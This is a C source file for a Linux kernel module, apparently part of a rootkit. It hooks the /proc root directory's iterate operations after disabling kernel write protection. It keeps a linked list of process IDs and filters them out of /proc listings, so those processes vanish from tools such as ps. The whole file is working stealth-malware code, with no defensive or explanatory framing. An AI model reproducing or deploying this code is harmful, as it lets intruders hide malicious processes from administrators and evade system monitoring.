#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/namei.h>

#include "err.h"
#include "procfs_ops.h"
#include "memory_prot.h"

#define MAX_PID_LENGTH  8

struct hidden_pid
{
	char pid[MAX_PID_LENGTH];
	struct list_head list;
};

/* Hidden pids linked list */
LIST_HEAD(hidden_pids);

static filldir_t proc_orig_filldir;
static int (*proc_orig_iterate)(struct file *, struct dir_context *);
static int (*proc_orig_iterate_shared)(struct file *, struct dir_context *);
static struct file_operations *proc_orig_fops;
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *dummy;
static struct file_operations dummy_fops =
{
	.owner = THIS_MODULE
};

static struct inode *proc_find_inode(const char *name)
{
	struct path path;
	int err = kern_path(name, LOOKUP_FOLLOW, &path);
	if (err) {
		log_err("couldn't find path : %s\n", name);
		return NULL;
	}
	return path.dentry->d_inode;

}

static bool is_pid_hidden(const char *pid)
{
	struct hidden_pid *hpid;
	if (list_empty(&hidden_pids))
		return false;
	list_for_each_entry(hpid, &hidden_pids, list) {
		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
			return true;
	}
	return false;
}

/* Add the given pid to the hidden pids list.
 * This list is used in filldir to check if a pid is hidden
 */
bool hide_pid(const char *pid)
{
	struct hidden_pid *hpid;
	if (!pid)
		return false;
	if (is_pid_hidden(pid)) {
		log_err("pid %s in already hidden\n", pid);
		return false;
	}
	hpid = kmalloc(sizeof(struct hidden_pid), GFP_KERNEL);
	if (!hpid) {
		log_err("kmalloc failed to alloc hidden_pid\n");
		return false;
	}
	strncpy(hpid->pid, pid, MAX_PID_LENGTH);
	INIT_LIST_HEAD(&hpid->list);
	list_add_tail(&hpid->list, &hidden_pids);
	return true;
}

/* You might need to unhide the pid to kill the process */
bool unhide_pid(const char *pid)
{
	struct hidden_pid *hpid;
	if (!pid)
		return false;
	if (!is_pid_hidden(pid)) {
		log_err("pid %s isn't hidden\n", pid);
		return false;
	}
	list_for_each_entry(hpid, &hidden_pids, list) {
		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
			break;
	}
	if(strncmp(hpid->pid, pid, MAX_PID_LENGTH))
		return false;
	list_del(&hpid->list);
	kfree(hpid);
	return true;
}

static int proc_zl_filldir(struct dir_context *ctx, const char *name,
		           int namelen, loff_t off, u64 ino, unsigned d_type)
{
	if (is_pid_hidden(name))
		return 0;
	return proc_orig_filldir(ctx, name, namelen, off, ino, d_type);
}

static int proc_zl_iterate(struct file *file, struct dir_context *ctx)
{
	int err;
	proc_orig_filldir = ctx->actor;
	*((filldir_t*)&ctx->actor) = proc_zl_filldir;
	if (proc_orig_iterate)
		err = proc_orig_iterate(file, ctx);
	else if (proc_orig_iterate_shared)
		err = proc_orig_iterate_shared(file, ctx);
	else {
		log_err("proc_orig_iterate_* are null\n");
		return 0;
	}
	*((filldir_t*)&ctx->actor) = proc_orig_filldir;
	return err;
}

static int zl_getattr(const struct path *path, struct kstat *stat,
		      u32 mask, unsigned int flags);

/* return wether init worked or failed */
bool init_procfs(void)
{
	dummy = proc_create("dummy", S_IFREG | S_IRUGO, NULL, &dummy_fops);
	if (!dummy) {
		log_err("Cannot create entry in procfs\n");
		remove_proc_entry("dummy", NULL);
		return false;
	}
	proc_root = dummy->parent;
	remove_proc_entry("dummy", NULL);
	if (strcmp(proc_root->name, "/proc")) {
		log_err("Cannot retrieve proc_root\n");
		return false;
	}
	proc_orig_fops = (struct file_operations *)proc_root->proc_fops;
	proc_orig_iterate = proc_orig_fops->iterate;
	proc_orig_iterate_shared = proc_orig_fops->iterate_shared;
	disable_wp();
	proc_orig_fops->iterate = proc_zl_iterate;
	proc_orig_fops->iterate_shared = proc_zl_iterate;
	enable_wp();
	return true;
}

void cleanup_procfs(void)
{
	if (!proc_orig_fops)
		return;
	disable_wp();
	proc_orig_fops->iterate = proc_orig_iterate;
	proc_orig_fops->iterate_shared = proc_orig_iterate_shared;
	enable_wp();
}
